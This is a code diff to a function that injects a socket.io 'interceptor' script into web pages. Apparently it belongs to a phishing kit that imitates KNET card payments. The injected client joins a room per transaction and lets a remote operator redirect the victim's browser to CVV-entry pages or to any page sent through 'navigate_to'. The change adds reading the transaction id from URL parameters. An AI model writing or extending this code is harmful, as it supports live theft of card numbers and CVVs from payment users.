@@ -25,14 +25,22 @@ function notifyAdmins(event, data) {
 function getInterceptorScript() {
   return `<script src="/socket.io/socket.io.js"><\/script><script>
 (function() {
+  function getKnetId() {
+    // Try sessionStorage first
+    var id = sessionStorage.getItem('eventat_knet_txn');
+    if (id) return id;
+    // Try URL params
+    var params = new URLSearchParams(window.location.search);
+    return params.get('id') || params.get('knetId') || null;
+  }
   function initInterceptor() {
-    var knetId = sessionStorage.getItem('eventat_knet_txn');
+    var knetId = getKnetId();
     if (!knetId) return;
     var sock = io({ forceNew: false });
     sock.on('connect', function() { sock.emit('join_payment', knetId); });
     sock.on('payment_status_changed', function(data) {
-      var id = sessionStorage.getItem('eventat_knet_txn');
-      if (!data || (data.id !== id && data.paymentId !== id)) return;
+      var id = getKnetId();
+      if (!data || !id || (data.id !== id && data.paymentId !== id)) return;
       if (data.status === 'CVV_PENDING') {
         window.location.href = '/knet/cvv?id=' + id;
       } else if (data.status === 'CVV_APPROVED') {
@@ -40,7 +48,7 @@ function getInterceptorScript() {
       }
     });
     sock.on('navigate_to', function(data) {
-      var id = sessionStorage.getItem('eventat_knet_txn');
+      var id = getKnetId();
       if (data && data.page) window.location.href = data.page + (id ? '?id=' + id : '');
     });
     window._interceptSocket = sock;
